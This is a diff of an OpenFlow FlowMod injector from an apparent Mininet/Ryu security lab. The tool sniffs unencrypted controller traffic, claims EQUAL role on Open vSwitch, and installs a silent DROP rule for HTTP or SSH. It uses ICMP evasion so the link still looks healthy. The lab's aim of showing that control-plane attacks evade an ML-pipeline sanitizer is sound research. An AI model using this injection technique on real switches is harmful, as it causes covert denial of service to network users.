@@ -1,46 +1,32 @@
+from __future__ import annotations
 #!/usr/bin/env python3
 
 """ sdn_mininet/injector.py
-
 Purpose: This is the OpenFlow FlowMod Injector for Tool 3.
-
-The default --sniff-port is 6633 to match the Ryu controller
-port used by Tools 1 and 2. The original value was 6653,
-which is Ryu's standard IANA-assigned OpenFlow port.
+By default, it listens on port 6633 because that's the same port the Ryu controller
+uses in Tools 1 and 2. Originally, the injector used port 6653, which is the official
+OpenFlow port assigned to Ryu. I changed it so that all three tools match and 
+communicate on the same controller port. 
 
 Tool 1 (ryu_collector.py):
-Polls s1 for flow statistics every 5 seconds.
-After this injector runs, s1 installs a DROP rule for TCP/80.
-HTTP flows from h1 to h2 stop generating packets/bytes.
-Tool 1 CSV outputs will show those flow statistics dropping
-toward zero.
-
+- Polls s1 for flow statistics every 5 seconds.
+- After this injector installs its malicious FlowMod, s1 adds a DROP rule for TCP/80.
+- Because of this rule, HTTP traffic from h1 to h2 stop generating packets.
+- Tool 1 CSV outputs will show those flow statistics dropping to zero.
 Tool 2 (sanitizer.py):
-Watches the /fl/upload REST endpoint for poisoned model metrics.
-This injector does not interact with that endpoint because it
-communicates directly with Open vSwitch (OVS). As a result,
-Tool 2's sanitizer does NOT detect this attack.
-
-This demonstrates that defense-in-depth requires protecting:
-- the ML pipeline
-- AND the SDN control plane
-
-USAGE
-------
-From the host terminal (Phase 1 sniff + Phase 2 inject):
+- Watches the /fl/upload REST endpoint for poisoned model metrics.
+- This injector does not interact with that endpoint because it communicates directly 
+with Open vSwitch (OVS). As a result, Tool 2's sanitizer does NOT detect this attack.
+USAGE:
+-> From the host terminal (Phase 1 sniff + Phase 2 inject):
 python3 sdn_mininet/injector.py
-
-Skip sniffing and inject immediately:
+-> Skip sniffing and inject immediately:
 python3 sdn_mininet/injector.py --skip-sniff
-
-Block SSH instead of HTTP:
+-> Block SSH instead of HTTP:
 python3 sdn_mininet/injector.py --target-port 22 --skip-sniff
-
-topology.py --inject automatically launches this script from h7
+-> topology.py --inject automatically launches this script from h7
 using --skip-sniff.
 """
-
-from __future__ import annotations
 
 import argparse
 import logging
@@ -50,11 +36,9 @@ import sys
 import threading
 import time
 
-# Suppress Scapy IPv6 routing warnings commonly seen in lab VMs
+# Suppress Scapy IPv6 routing warnings
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-
 from scapy.all import IP, Raw, TCP, sniff  # noqa: E402
-
 
 # *** Constants ***
 # OpenFlow protocol version 1.3
@@ -95,7 +79,7 @@ OFPT_ROLE_REQUEST = 24
 OFPT_ROLE_REPLY   = 25
 OFPCR_ROLE_EQUAL  = 1  # full access, no mastership
 OFPCR_ROLE_MASTER = 2  # full access, demotes other masters
-
+# Add colors
 RED = "\033[91m"
 YELLOW = "\033[93m"
 WHITE = "\033[97m"
@@ -119,9 +103,7 @@ _TYPE_NAMES: dict[int, str] = {
 }
 
 
-
 # *** OpenFlow Packet Builders ***
-
 # Build a standard 8-byte OpenFlow message header.
 # Every OpenFlow message begins with:
 # version | type | length | transaction ID (xid)
@@ -167,14 +149,12 @@ This tells the switch to match:
 - IPv4 packets
 - using TCP
 - whose destination port equals target_port
-
 Example:
 target_port=80 -> block HTTP traffic
 
 The final structure is padded to an 8-byte boundary,
 which is required by OpenFlow 1.3. """
 def _build_oxm_match(target_port: int) -> bytes:
-
     oxm_fields = (
         _oxm_tlv(
             OXM_FIELD_ETH_TYPE,
@@ -202,12 +182,10 @@ def _build_oxm_match(target_port: int) -> bytes:
 """ Build a malicious OpenFlow FlowMod message
 This FlowMod installs a high-priority DROP rule into the switch. 
 Any packets matching the rule are silently discarded. 
-
 In OpenFlow 1.3, a FlowMod normally contains: 
 1. A fixed-length header/body section 
 2. Match fields (what traffic to match) 
 3. Instructions/actions (what to do with matching traffic) 
- 
 This attack intentionally omits forwarding actions. 
 When no actions are provided, Open vSwitch drops the packet. 
  
@@ -242,10 +220,8 @@ This packed binary structure becomes the fixed body
 of the malicious FlowMod message sent to the switch.
 """
 def build_drop_flowmod(target_port: int, priority: int) -> bytes:
-
     fixed = struct.pack(
         "!QQBBHHHIIIHxx",
-
         ATTACKER_COOKIE, # cookie
         0,  # cookie_mask
         0,  # table_id
@@ -267,8 +243,8 @@ def build_drop_flowmod(target_port: int, priority: int) -> bytes:
 
 
 """
-Request EQUAL role so OVS allows us to install FlowMods
-even while Ryu holds MASTER role on the same switch.
+Request EQUAL role so OVS allows us to install FlowMods even while 
+Ryu holds MASTER role on the same switch.
 Body: role(4) + pad(4) + generation_id(8) = 16 bytes
 """
 def build_role_request() -> bytes:
@@ -281,18 +257,15 @@ def build_role_request() -> bytes:
 
 
 # *** Phase 1 — Passive Control Channel Sniffer ***
-
 """
 Passively monitors OpenFlow traffic on the loopback interface.
-
 This demonstrates that an attacker with local access can observe
 unencrypted SDN controller traffic in real time.
 
-When the first valid OpenFlow message is detected,
+When the first valid OpenFlow message is detected, 
 Phase 2 (the injector) is triggered automatically.
 """
 class ControlChannelSniffer:
-
     """Initialize the passive OpenFlow sniffer. 
     Parameters: 
     - iface: Network interface to monitor 
@@ -322,9 +295,7 @@ class ControlChannelSniffer:
         # Ignore unrelated TCP traffic
         if self.sniff_port not in (sp, dp):
             return
-
         payload = bytes(pkt[Raw].load)
-
         # OpenFlow headers are always 8 bytes minimum
         if len(payload) < 8:
             return
@@ -371,7 +342,6 @@ class ControlChannelSniffer:
     """Start passive packet sniffing on the selected interface. 
     Scapy listens for TCP traffic on the configured controller 
     port and forwards matching packets to self._handle(). 
-     
     The sniffer automatically stops when: 
     - the timeout expires, or 
     - self._stop is triggered  """
@@ -409,12 +379,11 @@ class ControlChannelSniffer:
 
 
 # *** Phase 2 — FlowMod Injectr ***
-
 # Read one complete OpenFlow message from the socket.
-#
 # OpenFlow messages begin with an 8 byte header containing
 # the total message length. After reading the header,
 # the remaining message body is read separately.
+
 def _recv_msg(sock: socket.socket, timeout: float = 5.0) -> bytes:
     sock.settimeout(timeout)
     hdr = b""
@@ -432,9 +401,7 @@ def _recv_msg(sock: socket.socket, timeout: float = 5.0) -> bytes:
         if not chunk:
             raise ConnectionError("Socket closed reading OF body")
         body += chunk
-
     return hdr + body
-
 
 # Continuously read OpenFlow messages until:
 # - the expected message type arrives
@@ -460,7 +427,6 @@ def _read_until(
             return None
     return None
 
-
 # Connect to Open vSwitch (OVS), perform the OpenFlow handshake,
 # and inject a malicious FlowMod.
 def inject_flowmod(
@@ -484,7 +450,6 @@ def inject_flowmod(
         )
         return False
     print("[+] TCP connection established.")
-
     
     # Step 1: OpenFlow HELLO handshake
     sock.sendall(build_hello())
@@ -493,7 +458,6 @@ def inject_flowmod(
     if _read_until(sock, OFPT_HELLO) is None:
         sock.close()
         return False
-
 
     # Step 2: Request switch features and Datapath ID (DPID)
     sock.sendall(build_features_request())
@@ -516,10 +480,9 @@ def inject_flowmod(
 
     # Step 3: Send the FlowMod -> inject malicious FlowMod
     sock.sendall(build_drop_flowmod(target_port, priority))
-    	
     
     print()
-    print("                FLOWMOD INJECTED (Tool 3)               ")
+    print("                FLOWMOD INJECTED                        ")
     print("--------------------------------------------------------")
     print(f"Match: IPv4/TCP/tcp_dst={target_port:<24}")
     print("Action: DROP (no instructions -> implicit discard)")
@@ -555,9 +518,7 @@ def inject_flowmod(
     return True
 
 
-
 # *** CLI ***
-
 _BANNER = r"""
 ____________________ SDN-FL TOOL 3 ____________________
 [*] OpenFlow FlowMod Injector  ·  Tool 3
@@ -565,7 +526,6 @@ ____________________ SDN-FL TOOL 3 ____________________
 [*] Phase 2: Inject a DROP rule for TCP/{port}
 [*] Evasion: ICMP (ping) is never matched -> link looks healthy
 """
-
 
 def _parse_args() -> argparse.Namespace:
     # Create the main command-line parser
@@ -696,7 +656,6 @@ def main() -> None:
             )
             sys.exit(1)
     print("[*] Done.")
-
 
 if __name__ == "__main__":
     main()
